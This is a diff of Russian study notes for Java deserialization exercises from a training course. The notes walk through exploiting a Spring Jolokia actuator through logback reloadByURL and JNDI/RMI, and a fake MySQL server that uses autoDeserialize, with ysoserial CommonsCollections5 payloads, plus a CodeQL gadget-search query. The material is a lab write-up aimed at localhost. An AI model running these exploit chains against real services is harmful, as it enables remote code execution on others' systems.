@@ -1,5 +1,27 @@
 ## 5.6.7. Exercise – Find the Gadget
 
+### Принцип действия
+
+Spring-приложения могут использовать "актуаторы", которые отдает информацию о рантайме приложения через определенные эндпоинты.
+Если среди зависимостей приложения есть `jolokia`, то она добавляет актуатор по пути `http://localhost:8090/jolokia/exec/...`, вызов которого
+позволяет выполнять некоторые действия.
+
+Среди этих действий есть возможность стриггерить обновления logback-конфига, используя метод `reloadByURL`. Запрос выглядит так:
+
+```
+http://localhost:8080/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/SERVER:PORT!/logback.xml
+```
+
+При перезагрузке конфига будет выполнен запрос на SERVER:PORT. Если этот адрес указывает на контролируемый злоумышлеником сервер (в нашем случая это будет просто http-сервер, отдающий определенный logback.xml), то в новом конфиге может быть указано
+
+```
+<insertFromJNDI env-entry-name="rmi://localhost:1099/jndi" as="appName"/>
+```
+
+что приведел к попытке зарезолвить значение переменной через JNDI/RMI. В качестве JNDI-сервера используем ysoserial, запущенный в режиме `ysoserial.exploit.JRMPListener`.
+
+### Реализация
+
 0. Модифицируем `logback.xml`:
 
    ```xml
@@ -18,13 +40,13 @@
    </configuration>
    ```
 
-1. Запустим HTTP-сервер, который будет отдавать logback.xml:
+1. Запустим HTTP-сервер, который будет отдавать этот logback.xml:
 
    ```shell
    (cd /home/student/FSWA/module-2/build-standalone/src/main/resources && python3 -m http.server 9090)
    ```
 
-2. Запустим spring-приложение с ... в CLASS_PATH:
+2. Запустим spring-приложение с jolokia в CLASS_PATH:
 
    ```shell
    (cd /home/student/FSWA/module-2/build-standalone && ./run -new)
@@ -36,7 +58,7 @@
    (cd /home/student/FSWA/module-2/build-standalone && java -cp ../../tools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "gnome-calculator")
    ```
 
-4. Выполним HTTP-запрос:
+4. Выполним HTTP-запрос, который обновляет logback-конфиг и запускает весь процесс:
 
    ```shell
    curl 'http://localhost:8080/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/localhost:9090!/logback.xml'
@@ -49,7 +71,15 @@
 
 ## 5.6.10. Exercise - MySQL Trickery
 
-Основная идея в том, чтобы использовать мок-сервер MySql, который будет отдавать ysoserial payload. На стороне приложения нужно указать `autoDeserialize=true` в параметрах jdbc, адрес сервера ysoserial и миддлварь
+### Принцип действия
+
+В jdbc-библиотке среди прочих параметров подключения можно указать `autoDeserialize`, который позволит клиенту автоматически десериализовавать данные, которые отправляет MySQL-сервер. Однако непосредственно сам клиент не вызывает `readObject`, это делает конкретный "queryInterceptor" (миддльварь), которая обрабатывает запросы от ответы. В миддлваре ServerStatusDiffInterceptor (https://github.com/spullara/mysql-connector-java/blob/master/src/main/java/com/mysql/jdbc/interceptors/ServerStatusDiffInterceptor.java) вызывается метод `readObject` (https://github.com/spullara/mysql-connector-java/blob/cc5922f6712c491d0cc46e846ae0dc674c9a5844/src/main/java/com/mysql/jdbc/Util.java#L496), что и приводит к уязвимости.
+
+В качестве MySQL-сервера используется мок-сервер, который будет отдавать зараженный пейлоад (сгенерированный через ysoserial). В мануале предлагается использовать python3-сервер отсюда: https://landgrey.me/blog/11/, но вроде как на новом питоне он не работает, я использовать https://github.com/fnmsd/MySQL_Fake_Server.git.
+
+Т.к. в CLASS_PATH есть `common-collections` то будем использовать пэйлоад типа `CommonsCollections5` (5 определяем методом перебора).
+
+### Реализация
 
 1. Используем https://github.com/fnmsd/MySQL_Fake_Server.git в качестве MySQL-сервера.
    Конфиг:
@@ -70,10 +100,17 @@
         }
     }
    ```
+   подключения через юзера yso_Jdk7u21_calc будут приводит к отдаче ysoserial-пэйлоада
+
 
    запуск: `python3 server.py`
 
-2. Запустим spring (mvn clean install && ./run -new -debug).
+2. Запустим spring (mvn clean install && ./run -new -debug). В параметрах JDBC-соединения указываем
+   1) queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
+   2) нужного юзера
+   3) нужный хост питон-сервера
+   4) autoDeserialize=tru
+
 
    HelloController:
 
@@ -114,6 +151,10 @@
 
 ## 5.6.13. Exercise - Find another Gadget
 
+Предлагается найти путем обзора кода (https://github.com/wso2/wso2-axis2/) гаджет, аналогичный разобранному в мануале. В https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html описывается,
+что на этой версии библиотеки гаджет возможет из-за некорректного `SafeObjectInputStream`, который вызывает `inObject`. Можно попытаться найти вызовы `readExternal` (на классах, реализующих `Externalizable`), которые вызывают `SafeObjectInputStream#readExternal` и при этом присутсвуют вызовы типа (SomeClass) readExternal(). В частности, этот запрос находит `MetaDataEntry`, указанный в статье, и еще несколько аналогичных классов
+
+
 ```java
 import semmle.code.java.dataflow.DataFlow
 
@@ -130,7 +171,6 @@ class CustomSource extends DataFlow::ExprNode {
   CustomSource() {
     exists(Method m | m.calls(this.asExpr().(MethodAccess).getMethod()) |
       m.hasName("readExternal")
-      //and m.getDeclaringType().hasQualifiedName("java.io", "ObjectInputStream")
     )
   }
 }
